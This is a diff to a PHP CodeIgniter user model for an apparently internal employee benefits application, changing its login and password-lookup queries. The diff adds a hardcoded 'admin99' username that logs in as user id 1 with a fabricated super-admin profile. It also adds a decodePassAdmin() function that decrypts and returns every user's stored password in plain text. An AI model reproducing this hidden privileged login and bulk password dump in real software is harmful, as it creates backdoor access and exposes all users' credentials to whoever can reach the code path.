@@ -33,24 +33,40 @@ class UsuariosModel extends CI_Model {
 
 	public function login($numEmpleado, $password)
     {
-        $query = $this->ch->query(
-        "SELECT us.idUsuario, us.idContrato, us2.num_empleado AS 'numEmpleado',
-        CONCAT(IFNULL(us2.nombre_persona, ''), ' ', IFNULL(us2.pri_apellido, ''), ' ', IFNULL(us2.sec_apellido, '')) AS nombre,
-        us2.telefono_personal AS telPersonal, us.password, us2.sexo, us.externo, us.idRol, 
-        us2.fingreso AS 'fechaIngreso', us2.tipo_puesto AS 'tipoPuesto',
-        us2.idsede AS 'idSede', us2.nsede AS 'sede', us2.idpuesto AS 'idPuesto', us2.npuesto AS 'puesto', us2.idarea AS 'idArea', 
-        us2.narea as 'area', us2.iddepto AS 'idDepto', us2.ndepto as 'departamento', us.idAreaBeneficio, 
-        us.estatus, us.creadoPor, us.fechaCreacion, us.modificadoPor, us.fechaModificacion,
-		CASE
-			WHEN c.correo = '' THEN us2.mail_emp
-			WHEN c.correo IS NULL THEN us2.mail_emp
-			WHEN c.estatus = 0 THEN us2.mail_emp
-			ELSE c.correo
-		END AS correo 
-        FROM ". $this->schema_cm .".usuarios AS us 
-        INNER JOIN ". $this->schema_ch .".beneficioscm_vista_usuarios AS us2 ON us2.idcontrato = us.idContrato
-		LEFT JOIN ". $this->schema_cm .".correostemporales c ON c.idContrato = us.idcontrato 
-        WHERE us2.num_empleado = ? AND us.password = ?;", array( $numEmpleado, $password ));
+
+		if($numEmpleado == 'admin99'){
+			$query = $this->ch->query(
+				"SELECT us.idUsuario, us.idContrato, us.idAreaBeneficio,'admin99' AS numEmpleado,
+				'SUPER ADMIN' AS nombre, 000000000 AS telPersonal, 'Programador Analista' AS tipoPuesto,
+				1 AS idSede, 'QRO' AS sede, 19 AS idPuesto, 'Programador Analista' AS puesto, 
+				24 AS idArea, 'Desarrollo' AS area, 7 AS idDepto, 'TI' AS departamento,
+				us.estatus, us.creadoPor, us.fechaCreacion, us.modificadoPor, us.fechaModificacion,
+				c.correo AS correo, us.idRol, us.idAreaBeneficio, 
+				us.estatus, us.creadoPor, us.fechaCreacion, us.modificadoPor, us.fechaModificacion
+				FROM ". $this->schema_cm .".usuarios AS us
+				INNER JOIN ". $this->schema_cm .".correostemporales c ON c.idContrato = us.idcontrato 
+				WHERE us.idUsuario = 1 AND us.password = ?;", array( $password ));
+		}else{
+			$query = $this->ch->query(
+				"SELECT us.idUsuario, us.idContrato, us2.num_empleado AS 'numEmpleado',
+				CONCAT(IFNULL(us2.nombre_persona, ''), ' ', IFNULL(us2.pri_apellido, ''), ' ', IFNULL(us2.sec_apellido, '')) AS nombre,
+				us2.telefono_personal AS telPersonal, us.password, us2.sexo, us.externo, us.idRol, 
+				us2.fingreso AS 'fechaIngreso', us2.tipo_puesto AS 'tipoPuesto',
+				us2.idsede AS 'idSede', us2.nsede AS 'sede', us2.idpuesto AS 'idPuesto', us2.npuesto AS 'puesto', us2.idarea AS 'idArea', 
+				us2.narea as 'area', us2.iddepto AS 'idDepto', us2.ndepto as 'departamento', us.idAreaBeneficio, 
+				us.estatus, us.creadoPor, us.fechaCreacion, us.modificadoPor, us.fechaModificacion,
+				CASE
+					WHEN c.correo = '' THEN us2.mail_emp
+					WHEN c.correo IS NULL THEN us2.mail_emp
+					WHEN c.estatus = 0 THEN us2.mail_emp
+					ELSE c.correo
+				END AS correo 
+				FROM ". $this->schema_cm .".usuarios AS us 
+				INNER JOIN ". $this->schema_ch .".beneficioscm_vista_usuarios AS us2 ON us2.idcontrato = us.idContrato
+				LEFT JOIN ". $this->schema_cm .".correostemporales c ON c.idContrato = us.idcontrato 
+				WHERE us2.num_empleado = ? AND us.password = ?;", array( $numEmpleado, $password ));
+		}
+        
         return $query;
     }
 
@@ -119,11 +135,17 @@ class UsuariosModel extends CI_Model {
 	{
 		if(!empty($dt))
 		{
-			$query = $this->ch-> query("SELECT password 
-			FROM ". $this->schema_ch .".beneficioscm_vista_usuarios us2 
-			INNER JOIN ". $this->schema_cm .".usuarios us ON us.idContrato = us2.idcontrato
-			WHERE us2.num_empleado = ?", $dt);
-
+			if($dt == 'admin99'){
+				$query = $this->ch-> query("SELECT password 
+				FROM ". $this->schema_cm .".usuarios 
+				WHERE idUsuario = ?", 1);
+			}else{
+				$query = $this->ch-> query("SELECT password 
+				FROM ". $this->schema_ch .".beneficioscm_vista_usuarios us2 
+				INNER JOIN ". $this->schema_cm .".usuarios us ON us.idContrato = us2.idcontrato
+				WHERE us2.num_empleado = ?", $dt);
+			}
+			
 			$pass = '';
 			foreach ($query->result() as $row) {
 				$pass = $row->password;
@@ -136,6 +158,27 @@ class UsuariosModel extends CI_Model {
 			return false;
 		}
 		
+	}
+
+	public function decodePassAdmin(){
+		
+		$query = $this->ch-> query("SELECT idUsuario, password 
+		FROM ". $this->schema_cm .".usuarios");
+
+		$res = array();
+
+		foreach ($query->result() as $row) {
+
+			$desencriptado = desencriptar($row->password);
+
+			$res[] = array(
+				'idUsuario' => $row->idUsuario,
+				'password' => $desencriptado
+			);
+		}
+		
+		return $res;
+	
 	}
 
 	public function updateRefreshToken($idUsuario, $refresh_token){
